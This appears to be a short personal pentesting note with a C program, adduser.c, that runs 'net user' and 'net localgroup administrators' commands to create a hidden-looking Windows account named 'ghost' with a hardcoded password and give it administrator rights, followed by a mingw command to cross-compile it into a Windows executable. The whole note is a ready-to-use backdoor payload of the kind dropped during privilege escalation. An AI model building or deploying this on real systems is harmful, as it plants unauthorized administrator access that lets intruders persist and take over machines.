---
title: Create user + add to administrators
updated: 2025-04-30 11:44:36Z
created: 2025-04-30 11:05:23Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

File: adduser.c
```
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user ghost Gh0st3d123! /add");
  i = system ("net localgroup administrators ghost /add");

  return 0;
}
```

Cross-Compiling to target architecutre
eg Windows 64-bit
`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
`